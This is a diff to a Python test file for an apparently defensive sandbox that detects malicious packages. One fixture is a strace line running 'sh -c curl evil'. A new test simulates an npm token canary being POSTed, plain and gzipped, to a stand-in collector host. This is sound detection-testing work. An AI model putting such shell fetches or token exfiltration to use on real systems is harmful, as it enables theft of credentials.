@@ -1,4 +1,5 @@
 import base64
+import gzip
 
 from bawabu_sandbox import evidence, honeypots
 
@@ -59,3 +60,13 @@ def test_notable_process_captured():
     strace = '7 execve("/bin/sh", ["sh", "-c", "curl evil"], 0x0) = 0\n'
     ev = evidence.build(strace, [], duration_s=0.3)
     assert any("sh -c curl evil" in p for p in ev.processes)
+
+
+def test_canary_in_a_binary_or_gzipped_body_is_still_found():
+    """The sink stores bodies that aren't UTF-8 as body_b64; the canary scan must look inside them too."""
+    secret = f"token={honeypots.NPM_TOKEN}".encode()
+    for raw in (b"\xff\xfe" + secret, gzip.compress(secret)):
+        sink = [{"kind": "http", "scheme": "https", "host": "collector.bawabu-test.invalid", "method": "POST",
+                 "path": "/c", "headers": {}, "body_b64": base64.b64encode(raw).decode()}]
+        ev = evidence.build("", sink, duration_s=1.0)
+        assert ev.exfiltration and ev.network[0].canaries and ev.network[0].had_body
